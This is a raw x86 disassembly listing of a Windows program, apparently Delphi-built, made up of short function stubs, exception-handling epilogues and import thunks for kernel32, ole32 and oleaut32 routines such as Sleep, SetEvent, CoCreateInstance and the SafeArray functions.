sub_40c5d4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c5f4
push eax
call CharNextA
retn
sub_40c918
jmp sub_403988
sub_40c91f
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c988
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cddf
jmp sub_403988
sub_40cde6
pop ebx
mov esp ebp
pop ebp
retn
sub_40cfaf
jmp sub_403988
sub_40cfb6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40d058
jmp sub_403988
sub_40d05f
pop ebx
mov esp ebp
pop ebp
retn
sub_40d064
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cfc8
sub_40d074
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d090
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4027bc
pop ebx
retn
sub_40d118
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d124
xchg [ eax ] edx
mov eax edx
retn
sub_40d184
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d214
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d32c
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d354
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d5cf
jmp sub_403988
sub_40d5d6
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d644
jmp sub_403988
sub_40d64b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d669
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d662
jmp sub_403988
sub_40d669
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40dab9
jmp sub_403988
sub_40dac0
pop ebp
retn
sub_40db2c
jmp sub_403988
sub_40db33
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantCopyInd
jmp [ VariantCopyInd@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40dbb4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40dc1a
jmp sub_403988
sub_40dc21
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc86
jmp sub_403988
sub_40dc8d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcf2
jmp sub_403988
sub_40dcf9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd5e
jmp sub_403988
sub_40dd65
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40ddca
jmp sub_403988
sub_40ddd1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40de49
jmp sub_403988
sub_40de50
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40debc
jmp sub_403988
sub_40dec3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40df2c
jmp sub_403988
sub_40df33
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dfa0
jmp sub_403988
sub_40dfa7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
SafeArrayAccessData
jmp [ SafeArrayAccessData@IAT ]
SafeArrayUnaccessData
jmp [ __import_lookup_table_11(oleaut32:SafeArrayUnaccessData) ]
SafeArrayGetElement
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetElement) ]
SafeArrayPutElement
jmp [ __import_lookup_table_11(oleaut32:SafeArrayPutElement) ]
sub_40e34d
jmp sub_403988
sub_40e354
pop ebp
retn
sub_40e358
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e01c
sub_40e369
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40eafe
jmp sub_403988
sub_40eb05
pop ecx
pop ebp
retn
sub_40eb97
jmp sub_403988
sub_40eb9e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ebee
jmp sub_403988
sub_40ebf5
pop ecx
pop ebp
retn
sub_40ec87
jmp sub_403988
sub_40ec8e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ecde
jmp sub_403988
sub_40ece5
pop ecx
pop ebp
retn
sub_40ef2d
jmp sub_403988
sub_40ef34
pop ebx
mov esp ebp
pop ebp
retn
sub_40f04a
jmp sub_403988
sub_40f051
pop ecx
pop ebp
retn
sub_40f054
push ebx
mov ebx eax
mov eax ebx
call sub_40f2ec
mov [ ebx ] 0x1
pop ebx
retn
sub_40f300
push eax
call sub_40f2ec
pop eax
retn
sub_40f560
call sub_40f614
retn
sub_40f678
xchg edx eax
call sub_412fa4
retn
sub_40f680
call sub_40f894
retn
sub_40f885
jmp sub_403988
sub_40f88c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f894
test [ edx + 0x1 ] 0x40
jne r-xdata
call sub_40f6bc
retn
call sub_40f614
retn
j_sub_40f8a8
jmp sub_40f8a8
sub_40f8cd
retn
sub_40f92c
jmp sub_403988
sub_40f933
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f97a
jmp sub_403988
sub_40f981
pop ebx
pop ecx
pop ebp
retn
sub_40f9c6
jmp sub_403988
sub_40f9cd
pop ebx
pop ecx
pop ebp
retn
sub_40fa12
jmp sub_403988
sub_40fa19
pop ebx
pop ecx
pop ebp
retn
sub_40fa5e
jmp sub_403988
sub_40fa65
pop ebx
pop ecx
pop ebp
retn
sub_40fe27
jmp sub_403988
sub_40fe2e
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fec8
jmp sub_403988
sub_40fecf
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41033d
jmp sub_4036d4
sub_4103f8
jmp sub_4036d4
sub_41049f
jmp sub_4036d4
sub_410598
jmp sub_4036d4
sub_410671
jmp sub_4036d4
sub_410759
jmp sub_4036d4
sub_410916
jmp sub_403988
sub_41091d
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41097f
jmp sub_403988
sub_410986
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410dec
jmp sub_4036d4
sub_410edb
jmp sub_403988
sub_410ee2
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410f80
jmp sub_403988
sub_410f87
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411324
call sub_410fdc
neg al
sbb eax eax
neg eax
retn
sub_4113e5
jmp sub_403988
sub_4113ec
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411495
jmp sub_403988
sub_41149c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4119ed
jmp sub_4036d4
sub_411af4
jmp sub_403988
sub_411afb
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411c05
jmp sub_403988
sub_411c0c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41205c
jmp sub_403988
sub_412063
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41216d
jmp sub_403988
sub_412174
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4126ba
jmp sub_403988
sub_4126c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412765
jmp sub_403988
sub_41276c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41278e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40472c
retn
sub_412787
jmp sub_403988
sub_41278e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4127ea
jmp sub_403988
sub_4127f1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41286d
jmp sub_403988
sub_412db3
jmp sub_403988
sub_412dba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412e4d
jmp sub_403988
sub_412e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e71
lea eax [ ebp - 0x14 ]
call sub_404714
retn
sub_412e6a
jmp sub_403988
sub_412e71
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ece
jmp sub_403988
sub_412ed5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412f77
jmp sub_403988
sub_412f94
jmp sub_403988
sub_412f9b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4134f6
jmp sub_403988
sub_4134fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41356e
jmp sub_403988
sub_413575
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413900
push eax
call sub_40f2ec
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413914
push eax
call sub_40f2ec
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413997
jmp sub_403988
sub_41399e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413a77
jmp sub_403988
sub_413a7e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413ada
jmp sub_403988
sub_413ae1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413ae8
call sub_413af0
retn
sub_413c40
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f614
add esp 0x10
sub_413eea
jmp sub_403988
sub_413ef1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413f38
jmp r-xdata
cmp [ eax ] 0x400c
je r-xdata
mov eax [ eax + 0x8 ]
retn
sub_413f48
push ecx
mov edx esp
call sub_415978
pop edx
retn
sub_413f54
cmp ax 0x8
je r-xdata
mov al 0x1
retn
cmp ax 0x100
je r-xdata
xor eax eax
retn
sub_413f68
push ebx
mov ebx eax
mov eax ebx
call sub_413f38
cmp [ eax ] 0x1
sete al
pop ebx
retn
sub_414009
jmp sub_403988
sub_414010
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414044
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f2ec
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_41405c
mov edx 0x80020004
call sub_414044
retn
sub_41420c
push ebx
mov ebx eax
mov eax ebx
call sub_414154
push eax
call SafeArrayUnaccessData
call sub_40ef3c
pop ebx
retn
sub_414224
mov edx eax
sub dx 0x16
jae r-xdata
xor eax eax
retn
movzx eax ax
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_414340
jmp sub_403988
sub_414347
pop ebx
mov esp ebp
pop ebp
retn
sub_4144a8
jmp sub_403988
sub_414520
xor edx edx
test eax eax
je r-xdata
mov eax edx
retn
xor ecx ecx
mov cl [ eax + 0x1 ]
add eax ecx
mov ecx [ eax + 0x6 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
sub_41453c
push ebx
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
cmp [ eax ] 0x11
je r-xdata
inc ebx
call sub_414520
sub_414a2b
jmp sub_403988
sub_414a66
jmp sub_403988
sub_414a6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d45
jmp sub_403988
sub_414d75
jmp sub_403988
sub_414d7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e09
jmp sub_403988
sub_414e10
pop esi
pop ebx
pop ebp
retn
sub_414e14
push ebp
mov ebp esp
call sub_4152a0
pop ebp
retn 0x4
sub_414ea0
push ebp
mov ebp esp
call sub_4152a0
pop ebp
retn 0x4
sub_415194
jmp sub_403988
sub_41519b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4151c8
lea eax [ ebp - 0x140 ]
call sub_404008
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_40402c
retn
sub_4151c1
jmp sub_403988
sub_41524f
jmp sub_403988
sub_415256
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403224
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a8
sub_415278
xor eax eax
retn
sub_41527c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_415290
mov [ ecx ] 0x8
mov al 0x1
retn
sub_415298
call sub_40eab4
retn
sub_4152a0
call sub_40eba4
retn
sub_4152b0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4152c4
call sub_4152a0
retn
sub_4152dc
mov eax edx
mov edx ecx
call sub_40f894
retn
sub_4152e8
push ebp
mov ebp esp
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
call sub_40fb58
pop ebp
retn 0x4
sub_4152fc
test [ edx + 0x1 ] 0x40
setne al
retn
sub_415304
push ebp
mov ebp esp
call sub_4152a8
pop ebp
retn 0x8
sub_415310
mov eax edx
mov edx ecx
call sub_413928
retn
sub_41531c
mov eax edx
mov edx ecx
call sub_4139a4
retn
sub_415328
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_415334
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_415368
mov ax [ edx ]
call sub_413f54
retn
sub_415374
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_413f7c
pop esi
pop ebx
retn
sub_415388
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_407ff4
pop esi
pop ebx
retn
sub_41568d
jmp sub_403988
sub_415694
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4157e7
jmp sub_403988
sub_415938
jmp sub_403988
sub_41593f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415948
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415954
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415960
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41596c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415a20
jmp sub_403988
sub_415ae9
jmp sub_403988
sub_415af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b0d
lea eax [ ebp - 0x10 ]
call sub_404008
retn
sub_415b06
jmp sub_403988
sub_415b0d
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415b18
call sub_40f054
retn
sub_415b8f
jmp sub_403988
sub_415b96
pop ebp
retn
sub_415c39
jmp sub_403988
sub_415c40
pop ebp
retn
sub_415d79
jmp sub_403988
sub_415d80
pop ebp
retn
sub_415d84
sub [ rw-data ] 0x1
retn
sub_415d8d
add eax 0xfffffff0
push eax
mov eax [ eax ]
mov eax [ eax + 0x50 ]
xchg [ esp ] eax
retn
sub_415d9a
add [ esp + 0x4 ] 0xfffffff0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_416257
jmp sub_403988
sub_41625e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416588
jmp sub_403988
sub_41658f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4165f7
jmp sub_403988
sub_4165fe
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4166fe
jmp sub_403988
sub_416705
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416a94
jmp sub_403988
sub_416a9b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416bd3
jmp sub_403988
sub_416bda
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416ca0
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_416c08
mov eax ebx
mov edx esp
call sub_40426c
add esp 0x100
pop ebx
retn
sub_416cfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_416dd8
jmp sub_403988
sub_416ddf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416e30
jmp sub_403988
sub_416e37
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416f84
jmp sub_403988
sub_416f8b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41705a
jmp sub_403988
sub_417061
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417378
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f614
pop esi
pop ebx
retn
sub_417562
jmp sub_403988
sub_417569
pop ebp
retn
sub_41756c
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ __import_lookup_table_12(ole32:IsEqualGUID) ]
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoGetClassObject
jmp [ CoGetClassObject@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
ProgIDFromCLSID
jmp [ ProgIDFromCLSID@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
OleSetMenuDescriptor
jmp [ OleSetMenuDescriptor@IAT ]
OleDraw
jmp [ OleDraw@IAT ]
IsAccelerator
jmp [ __import_lookup_table_12(ole32:IsAccelerator) ]
CreateStreamOnHGlobal
jmp [ __import_lookup_table_12(ole32:CreateStreamOnHGlobal) ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
sub_417899
jmp sub_403988
sub_4178a0
pop ebp
retn
sub_4178a4
sub [ rw-data ] 0x1
retn
sub_4181a7
add [ esp + 0x4 ] 0xfffffff8
jmp sub_41ac58
sub_418532
inc ecx
add al ah
retn
sub_418ae6
inc ecx
add [ eax ] dh
iretd
sub_418cad
add [ esp + 0x4 ] 0xffffffd8
jmp sub_420f18
sub_418cb7
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_419024
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_419148
mov eax [ eax + 0xc ]
call sub_41a30c
retn
sub_41941f
jmp sub_403988
sub_419426
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41942c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a4c4
test eax eax
setge al
pop esi
pop ebx
retn
sub_41972f
jmp sub_403988
sub_419736
mov esp ebp
pop ebp
retn
sub_419804
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_419810
push ebx
mov ebx edx
mov edx ebx
call sub_419624
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_419384
sub_4198bc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_419a17
jmp sub_403988
sub_419aeb
jmp sub_403988
sub_419afc
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_419b68
jmp sub_403988
sub_419b6f
pop ebx
mov esp ebp
pop ebp
retn
sub_419bba
jmp sub_403988
sub_419bc1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419c4d
jmp sub_403988
sub_419c54
pop ebx
pop ebp
retn
sub_419c9a
jmp sub_403988
sub_419ca1
pop ebx
pop ebp
retn
sub_419ce6
jmp sub_403988
sub_419ced
pop ebx
pop ebp
retn
sub_419d37
jmp sub_403988
sub_419d3e
pop esi
pop ebx
pop ebp
retn
sub_419d92
jmp sub_403988
sub_419d99
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419ec6
jmp sub_403988
sub_419f9c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41a604
sub_41a08c
jmp sub_403988
sub_41a216
jmp sub_403988
sub_41a21d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a2b7
jmp sub_403988
sub_41a2be
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2dd
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41a2d6
jmp sub_403988
sub_41a2dd
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41a340
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a660
xor edx edx
mov eax ebx
call sub_41a624
pop ebx
retn
sub_41a3b8
mov eax [ ebp + 0x4 ]
retn
sub_41a3ee
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a43c
jmp sub_403988
sub_41a443
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a448
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_41a460
xor edx edx
call sub_41a468
retn
sub_41a550
mov edx [ eax + 0x8 ]
dec edx
call sub_41a468
retn
sub_41a6d0
retn
sub_41a78a
jmp sub_403988
sub_41a791
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035a8
sub_41a820
jmp sub_403988
sub_41a827
pop ebx
pop ecx
pop ebp
retn
sub_41a82c
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41a883
jmp sub_403988
sub_41a88a
pop ebx
pop ecx
pop ebp
retn
sub_41a890
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41a8cc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
retn
sub_41a8e4
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41a9bf
retn
sub_41aa64
test edx edx
je r-xdata
xor edx edx
call sub_41aa78
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41ab2e
jmp sub_403988
sub_41ab35
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ab48
xchg edx eax
call sub_41aa78
retn
sub_41ab50
retn
sub_41abe9
jmp sub_403988
sub_41abf0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ac46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41adad
jmp sub_403988
sub_41adb4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ae48
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_41a4c4
retn
sub_41af1d
jmp sub_403988
sub_41af24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41af68
xor edx edx
call sub_41ae24
retn
sub_41afc0
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41b02a
jmp sub_403988
sub_41b1f6
jmp sub_403988
sub_41b1fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b21a
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41b213
jmp sub_403988
sub_41b21a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b2a4
jmp sub_403988
sub_41b2bc
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41b378
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41b421
jmp sub_403988
sub_41b428
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b434
mov eax [ ebp + 0x4 ]
retn
sub_41b46a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41b4b8
jmp sub_403988
sub_41b4bf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b57e
jmp sub_403988
sub_41b585
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b5a7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_41b5a0
jmp sub_403988
sub_41b5a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b5b0
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41b5b8
xor eax eax
retn
sub_41b601
jmp sub_403988
sub_41b608
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41b71b
jmp sub_403988
sub_41b722
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b7b0
jmp sub_403988
sub_41b7b7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b887
jmp sub_403988
sub_41b88e
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b944
jmp sub_403988
sub_41b94b
pop esi
pop ecx
pop ebp
retn
sub_41b9d0
jmp sub_403988
sub_41b9d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9f4
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_41b9ed
jmp sub_403988
sub_41b9f4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ba80
jmp sub_403988
sub_41ba9d
jmp sub_403988
sub_41baa4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bae0
retn
sub_41bb63
jmp sub_403988
sub_41bb6a
mov eax [ ebp - 0x8 ]
call sub_41e6a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb8f
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41bb88
jmp sub_403988
sub_41bb8f
mov esp ebp
pop ebp
retn
sub_41bbdf
jmp sub_403988
sub_41bbe6
pop esi
pop ecx
pop ebp
retn
sub_41bc39
jmp sub_403988
sub_41bc40
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bc48
retn
sub_41bcc3
jmp sub_403988
sub_41bcca
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bd67
jmp sub_403988
sub_41bd6e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd8b
lea eax [ ebp - 0x8 ]
call sub_404008
retn
sub_41bd84
jmp sub_403988
sub_41bd8b
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bd90
retn
sub_41be0a
jmp sub_403988
sub_41be11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41be18
mov eax edx
mov edx ecx
call sub_4081d4
retn
sub_41be24
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41be3c
sub_41beb4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41bf24
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41bf40
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
